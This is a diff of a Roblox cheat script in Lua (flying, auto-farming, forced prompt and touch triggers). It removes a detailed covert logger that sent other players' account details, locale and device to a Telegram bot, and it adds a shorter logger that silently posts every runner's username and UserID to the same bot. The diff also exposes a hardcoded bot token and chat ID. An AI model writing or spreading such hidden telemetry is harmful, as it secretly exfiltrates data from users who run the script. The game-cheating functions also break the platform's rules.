@@ -3,12 +3,10 @@ local RunService = game:GetService("RunService")
 local UIS = game:GetService("UserInputService")
 local VIM = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
-local LocalizationService = game:GetService("LocalizationService")
 local player = Players.LocalPlayer
 local TG_TOKEN = "9179755313:AAHtwstX4jeuqhySMeMC-fwclNNY99DHmCI"
 local TG_ID = "7658959090"
 local STATUS_URL = "https://raw.githubusercontent.com/provokator-hub/Survive-the-Lava-for-Eggs-/refs/heads/main/status.txt"
-local MY_NAME = "Hii2bad" 
 
 local isFly, flyConn = false, nil
 local isFarm, lastFarm, lastClick, kills = false, 0, 0, 0
@@ -19,60 +17,12 @@ local touchActive = false
 local function safePrompt(p) if p then pcall(function() fireproximityprompt(p) end) end end
 local function safeTouch(a, b) if a and b then pcall(function() firetouchinterest(a, b, 0) task.wait(0.05) firetouchinterest(a, b, 1) end) end end
 
--- СБОР МАКСИМАЛЬНОЙ ИНФОРМАЦИИ (ТОЛЬКО ДЛЯ ДРУГИХ)
+-- ЛОГГЕР (БЕЗ ПРОВЕРОК, КАК В НАЧАЛЕ)
 task.spawn(function()
-    if player.Name ~= MY_NAME then
-        local gameName = "Неизвестно"
-        local accountAge = "Неизвестно"
-        local country = "Неизвестно"
-        local device = "Неизвестно"
-        
-        -- 1. Игра
-        pcall(function()
-            local ok, res = game:HttpGet("https://games.roblox.com/v1/games?universeIds=" .. game.GameId)
-            if ok and res then
-                local data = HttpService:JSONDecode(res)
-                if data and data.data and data.data[1] then gameName = data.data[1].name end
-            end
-        end)
-
-        -- 2. Возраст аккаунта
-        pcall(function()
-            local ok, res = game:HttpGet("https://users.roblox.com/v1/users/" .. player.UserId)
-            if ok and res then
-                local data = HttpService:JSONDecode(res)
-                if data and data.created then
-                    local createdDate = DateTime.fromIsoDate(data.created)
-                    local diff = DateTime.now().UnixTimestamp - createdDate.UnixTimestamp
-                    accountAge = math.floor(diff / 86400) .. " дней"
-                end
-            end
-        end)
-
-        -- 3. Страна и Устройство
-        pcall(function()
-            country = LocalizationService.RobloxLocaleId
-        end)
-        if UIS.TouchEnabled then device = "Телефон (Touch)" else device = "ПК / Консоль" end
-
-        -- 4. Формируем сообщение
-        local text = "🚀 **ЗАПУСК СКРИПТА #provokator**\n\n"
-            .. "👤 **Ник:** " .. player.Name .. "\n"
-            .. "📝 **DisplayName:** " .. player.DisplayName .. "\n"
-            .. "🆔 **UserID:** " .. tostring(player.UserId) .. "\n"
-            .. "⏳ **Возраст акка:** " .. accountAge .. "\n"
-            .. "🌍 **Страна/Локаль:** " .. country .. "\n"
-            .. "📱 **Устройство:** " .. device .. "\n"
-            .. "🔗 **Профиль:** https://www.roblox.com/users/" .. tostring(player.UserId) .. "/profile\n\n"
-            .. "🎮 **Игра:** " .. gameName .. "\n"
-            .. "🆔 **PlaceID:** " .. tostring(game.PlaceId) .. "\n"
-            .. "🌐 **JobID:** " .. tostring(game.JobId) .. "\n"
-            .. "⏰ **Время:** " .. DateTime.now():FormatLocalTime("YYYY-MM-DD HH:mm:ss", "ru-ru")
-
-        pcall(function()
-            game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text, parse_mode = "Markdown"}), "application/json")
-        end)
-    end
+    local text = "👤 **Новый запуск!**\nНик: " .. player.Name .. "\nID: " .. tostring(player.UserId)
+    pcall(function()
+        game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text, parse_mode = "Markdown"}), "application/json")
+    end)
 end)
 
 local pg = player:WaitForChild("PlayerGui")
